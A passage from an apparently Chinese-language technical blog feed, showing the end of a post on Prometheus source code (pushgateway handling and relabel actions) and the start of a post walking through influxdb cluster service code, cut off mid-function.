inconsistent with existing metrics: %v"</span>, err),</span><br><span class="line">http.StatusBadRequest,</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line">level.Error(logger).Log(</span><br><span class="line"><span class="string">"msg"</span>, <span class="string">"pushed metrics are invalid or inconsistent with existing metrics"</span>,</span><br><span class="line"><span class="string">"method"</span>, r.Method,</span><br><span class="line"><span class="string">"source"</span>, r.RemoteAddr,</span><br><span class="line"><span class="string">"err"</span>, err.Error(),</span><br><span class="line">)</span><br><span class="line">errReceived = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">instrumentedHandler := promhttp.InstrumentHandlerRequestSize(</span><br><span class="line">httpPushSize, promhttp.InstrumentHandlerDuration(</span><br><span class="line">httpPushDuration, promhttp.InstrumentHandlerCounter(</span><br><span class="line">httpCnt.MustCurryWith(prometheus.Labels&#123;<span class="string">"handler"</span>: <span class="string">"push"</span>&#125;),</span><br><span class="line">handler,</span><br><span class="line">)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request, params httprouter.Params)</span></span> &#123;</span><br><span class="line">mtx.Lock()</span><br><span class="line">ps = params</span><br><span class="line">instrumentedHandler.ServeHTTP(w, r)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据push完会放入pushgateway的缓存队列中存储，prometheus通过配置，采用pull的方式拉取数据获取指标。</p><h2 id="relabel"><a href="#relabel" class="headerlink" title="relabel"></a>relabel</h2><p>relabel功能主要是用于实现多数据中心的监控数据聚合。Relabel可以在Prometheus采集数据之前，通过Target实例的Metadata信息，动态重新写入Label的值。relabel可以对Target实例进行过滤和选择。</p><p>relabel实现过程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Process returns a relabeled copy of the given label set. The relabel configurations</span></span><br><span class="line"><span class="comment">// are applied in order of input.</span></span><br><span class="line"><span class="comment">// If a label set is dropped, nil is returned.</span></span><br><span class="line"><span class="comment">// May return the input labelSet modified.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Process</span><span class="params">(labels model.LabelSet, cfgs ...*config.RelabelConfig)</span> <span class="title">model</span>.<span class="title">LabelSet</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, cfg := <span class="keyword">range</span> cfgs &#123;</span><br><span class="line">labels = relabel(labels, cfg)</span><br><span class="line"><span class="keyword">if</span> labels == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> labels</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用process函数来处理，针对每个配置进行relabel操作。</p><p>relabel函数实现，relabel的类型有：RelabelDrop， RelabelKeep，RelabelReplace，RelabelLabelMap，RelabelLabelDrop，RelabelLabelKeep，RelabelHashMod</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">relabel</span><span class="params">(labels model.LabelSet, cfg *config.RelabelConfig)</span> <span class="title">model</span>.<span class="title">LabelSet</span></span> &#123;</span><br><span class="line">values := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(cfg.SourceLabels))</span><br><span class="line"><span class="keyword">for</span> _, ln := <span class="keyword">range</span> cfg.SourceLabels &#123;</span><br><span class="line">values = <span class="built_in">append</span>(values, <span class="keyword">string</span>(labels[ln]))</span><br><span class="line">&#125;</span><br><span class="line">val := strings.Join(values, cfg.Separator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> cfg.Action &#123;</span><br><span class="line"><span class="keyword">case</span> config.RelabelDrop:</span><br><span class="line"><span class="keyword">if</span> cfg.Regex.MatchString(val) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> config.RelabelKeep:</span><br><span class="line"><span class="keyword">if</span> !cfg.Regex.MatchString(val) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> config.RelabelReplace:</span><br><span class="line">indexes := cfg.Regex.FindStringSubmatchIndex(val)</span><br><span class="line"><span class="comment">// If there is no match no replacement must take place.</span></span><br><span class="line"><span class="keyword">if</span> indexes == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">target := model.LabelName(cfg.Regex.ExpandString([]<span class="keyword">byte</span>&#123;&#125;, cfg.TargetLabel, val, indexes))</span><br><span class="line"><span class="keyword">if</span> !target.IsValid() &#123;</span><br><span class="line"><span class="built_in">delete</span>(labels, model.LabelName(cfg.TargetLabel))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">res := cfg.Regex.ExpandString([]<span class="keyword">byte</span>&#123;&#125;, cfg.Replacement, val, indexes)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="built_in">delete</span>(labels, model.LabelName(cfg.TargetLabel))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">labels[target] = model.LabelValue(res)</span><br><span class="line"><span class="keyword">case</span> config.RelabelHashMod:</span><br><span class="line">mod := sum64(md5.Sum([]<span class="keyword">byte</span>(val))) % cfg.Modulus</span><br><span class="line">labels[model.LabelName(cfg.TargetLabel)] = model.LabelValue(fmt.Sprintf(<span class="string">"%d"</span>, mod))</span><br><span class="line"><span class="keyword">case</span> config.RelabelLabelMap:</span><br><span class="line">out := <span class="built_in">make</span>(model.LabelSet, <span class="built_in">len</span>(labels))</span><br><span class="line"><span class="comment">// Take a copy to avoid infinite loops.</span></span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> labels &#123;</span><br><span class="line">out[ln] = lv</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ln, lv := <span class="keyword">range</span> labels &#123;</span><br><span class="line"><span class="keyword">if</span> cfg.Regex.MatchString(<span class="keyword">string</span>(ln)) &#123;</span><br><span class="line">res := cfg.Regex.ReplaceAllString(<span class="keyword">string</span>(ln), cfg.Replacement)</span><br><span class="line">out[model.LabelName(res)] = lv</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">labels = out</span><br><span class="line"><span class="keyword">case</span> config.RelabelLabelDrop:</span><br><span class="line"><span class="keyword">for</span> ln := <span class="keyword">range</span> labels &#123;</span><br><span class="line"><span class="keyword">if</span> cfg.Regex.MatchString(<span class="keyword">string</span>(ln)) &#123;</span><br><span class="line"><span class="built_in">delete</span>(labels, ln)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> config.RelabelLabelKeep:</span><br><span class="line"><span class="keyword">for</span> ln := <span class="keyword">range</span> labels &#123;</span><br><span class="line"><span class="keyword">if</span> !cfg.Regex.MatchString(<span class="keyword">string</span>(ln)) &#123;</span><br><span class="line"><span class="built_in">delete</span>(labels, ln)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">panic</span>(fmt.Errorf(<span class="string">"retrieval.relabel: unknown relabel action type %q"</span>, cfg.Action))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> labels</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>action=keep, 丢弃指定源标签的标签值没有匹配到regex的target</p><p>action=drop，丢弃指定源标签的标签值匹配到regex的target</p><p>action=labeldrop，丢弃匹配到regex 的标签</p><p>action=labelkeep，丢弃没有匹配到regex 的标签</p><p>action=replace，更改标签名、更改标签值、合并标签</p><p>action=hashmod，将多个源标签的值进行hash，作为target标签的值</p><p>action=labelmap，Regex匹配名-&gt;replacement用原标签名的部分来替换名</p><p><strong>replace是缺省action，可以不配置action</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/c21d399c140a" target="_blank" rel="noopener">https://www.jianshu.com/p/c21d399c140a</a></p><p><a href="https://blog.csdn.net/luanpeng825485697/article/details/82318204" target="_blank" rel="noopener">https://blog.csdn.net/luanpeng825485697/article/details/82318204</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Prometheus-架构和源码&quot;&gt;&lt;a href=&quot;#Prometheus-架构和源码&quot; class=&quot;headerlink&quot; title=&quot;Prometheus 架构和源码&quot;&gt;&lt;/a&gt;Prometheus 架构和源码&lt;/h1&gt;&lt;h2 id=&quot;Prometheu
      
    
    </summary>
    
    
      <category term="prometheus" scheme="http://www.mydreamdll.xyz/categories/prometheus/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>influxdb集群代码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/02/17/influxdb%20%E9%9B%86%E7%BE%A4%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/02/17/influxdb%20%E9%9B%86%E7%BE%A4%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-02-17T03:14:59.099Z</published>
    <updated>2020-02-17T03:13:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="influxdb集群代码分析"><a href="#influxdb集群代码分析" class="headerlink" title="influxdb集群代码分析"></a>influxdb集群代码分析</h2><p>本文主要分析下influxdb中cluster部分的代码：</p><p>入口函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Server)</span> <span class="title">OpenDataServer</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> s.TSDBStore != <span class="literal">nil</span> &amp;&amp; !s.DataServicesOpened &#123;</span><br><span class="line">s.DataServicesOpened = <span class="literal">true</span></span><br><span class="line"><span class="comment">// Append services.</span></span><br><span class="line">s.appendClusterService(s.config.Cluster)   <span class="comment">// 增加集群服务注册</span></span><br><span class="line">s.appendMonitorService()</span><br><span class="line">s.appendPrecreatorService(s.config.Precreator)</span><br><span class="line">s.appendSnapshotterService()</span><br><span class="line">s.appendContinuousQueryService(s.config.ContinuousQuery)</span><br><span class="line">s.appendAntiEntropyService(s.config.AntiEntropy)</span><br><span class="line">s.appendHTTPDService(s.config.HTTPD)</span><br><span class="line">s.appendStorageService(s.config.Storage)</span><br><span class="line">s.appendRetentionPolicyService(s.config.Retention)</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.GraphiteInputs &#123;</span><br><span class="line"><span class="keyword">if</span> err := s.appendGraphiteService(i); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.CollectdInputs &#123;</span><br><span class="line">s.appendCollectdService(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.OpenTSDBInputs &#123;</span><br><span class="line"><span class="keyword">if</span> err := s.appendOpenTSDBService(i); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.UDPInputs &#123;</span><br><span class="line">s.appendUDPService(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.Subscriber.MetaClient = s.MetaClient</span><br><span class="line">s.PointsWriter.MetaClient = s.MetaClient</span><br><span class="line">s.Monitor.MetaClient = s.MetaClient</span><br><span class="line">s.ShardWriter.MetaClient = s.MetaClient</span><br><span class="line">s.HintedHandoff.MetaClient = s.MetaClient</span><br><span class="line"></span><br><span class="line">s.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader)</span><br><span class="line">s.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Configure logging for all services and clients.</span></span><br><span class="line"><span class="keyword">if</span> s.config.Meta.LoggingEnabled &#123;</span><br><span class="line">s.MetaClient.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.TSDBStore.WithLogger(s.Logger)</span><br><span class="line"><span class="keyword">if</span> s.config.Data.QueryLogEnabled &#123;</span><br><span class="line">s.QueryExecutor.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.PointsWriter.WithLogger(s.Logger)</span><br><span class="line">s.Subscriber.WithLogger(s.Logger)</span><br><span class="line">s.HintedHandoff.WithLogger(s.Logger)</span><br><span class="line"><span class="keyword">for</span> _, svc := <span class="keyword">range</span> s.Services &#123;</span><br><span class="line">svc.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.SnapshotterService.WithLogger(s.Logger)</span><br><span class="line">s.Monitor.WithLogger(s.Logger)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open TSDB store.</span></span><br><span class="line"><span class="keyword">if</span> err := s.TSDBStore.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open tsdb store: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the hinted handoff service</span></span><br><span class="line"><span class="keyword">if</span> err := s.HintedHandoff.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open hinted handoff: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the subscriber service</span></span><br><span class="line"><span class="keyword">if</span> err := s.Subscriber.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open subscriber: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the points writer service</span></span><br><span class="line"><span class="keyword">if</span> err := s.PointsWriter.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open points writer: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.PointsWriter.AddWriteSubscriber(s.Subscriber.Points())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, service := <span class="keyword">range</span> s.Services &#123;</span><br><span class="line"><span class="keyword">if</span> err := service.Open(); err != <span class="literal">nil</span> &#123;             <span class="comment">//集群服务启动</span></span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open service: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> s.TSDBStore == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"Data server is not enabled"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动集群服务代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open opens the network listener and begins serving requests.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">Open</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line">s.Logger.Info(<span class="string">"Starting cluster service"</span>)</span><br><span class="line"><span class="comment">// Begin serving conections.</span></span><br><span class="line">s.wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> s.serve()   <span class="comment">//启动服务</span></span><br><span class="line"></span><br><span class="line">s.CopyShardTaskManager.Logger = s.Logger</span><br><span class="line"><span class="keyword">go</span> s.CopyShardTaskManager.WaitForTask()               <span class="comment">//等待task任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>serve函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// serve accepts connections from the listener and handles them.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">serve</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> s.wg.Done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="comment">// Check if the service is shutting down.</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-s.closing:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Accept the next connection.</span></span><br><span class="line">conn, err := s.Listener.Accept()            <span class="comment">//监听连接请求</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> strings.Contains(err.Error(), <span class="string">"connection closed"</span>) &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"cluster service accept error"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">s.Logger.Info(<span class="string">"accept error"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delegate connection handling to a separate goroutine.</span></span><br><span class="line">s.wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> s.wg.Done()</span><br><span class="line">s.handleConn(conn)             <span class="comment">//主要处理函数</span></span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handleConn函数启动：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handleConn services an individual TCP connection.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">handleConn</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line"><span class="comment">// Ensure connection is closed when service is closed.</span></span><br><span class="line">closing := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(closing)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-closing:</span><br><span class="line"><span class="keyword">case</span> &lt;-s.closing:</span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">s.Logger.Info(<span class="string">"accept remote connection"</span>, zap.String(<span class="string">"remoteaddr"</span>, conn.RemoteAddr().String()))</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"close remote connection"</span>, zap.String(<span class="string">"remoteaddr"</span>, conn.RemoteAddr().String()))</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="comment">// Read type-length-value.</span></span><br><span class="line">typ, err := ReadType(conn)     <span class="comment">//读取连接的数据类型</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> strings.HasSuffix(err.Error(), <span class="string">"EOF"</span>) &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">s.Logger.Info(<span class="string">"unable to read type"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delegate message processing by type.</span></span><br><span class="line">        <span class="comment">//处理不同数据类型</span></span><br><span class="line"><span class="keyword">switch</span> typ &#123;</span><br><span class="line"><span class="keyword">case</span> writeShardRequestMessage:</span><br><span class="line">buf, err := ReadLV(conn)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Error(<span class="string">"unable to read length-value"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理写shared请求</span></span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardReq, <span class="number">1</span>)</span><br><span class="line">err = s.processWriteShardRequest(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"process write shard error"</span>, zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line">            <span class="comment">//处理写请求返回</span></span><br><span class="line">s.writeShardResponse(conn, err)</span><br><span class="line"><span class="keyword">case</span> executeStatementRequestMessage:</span><br><span class="line">buf, err := ReadLV(conn) <span class="comment">// ReadLV reads the length-value from a TLV record.</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"unable to read length-value"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理执行</span></span><br><span class="line">err = s.processExecuteStatementRequest(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"process execute statement error"</span>, zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line">s.writeShardResponse(conn, err)</span><br><span class="line"><span class="keyword">case</span> createIteratorRequestMessage:</span><br><span class="line">atomic.AddInt64(&amp;s.stats.CreateIteratorReq, <span class="number">1</span>)</span><br><span class="line">s.processCreateIteratorRequest(conn)  <span class="comment">//创建请求的interator</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> fieldDimensionsRequestMessage:</span><br><span class="line">atomic.AddInt64(&amp;s.stats.FieldDimensionsReq, <span class="number">1</span>)</span><br><span class="line">s.processFieldDimensionsRequest(conn)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> createIteratorCostRequestMessage:</span><br><span class="line">s.processCreateIteratorCostRequest(conn)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> mapTypeRequestMessage:</span><br><span class="line">s.processMapTypeRequest(conn)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> 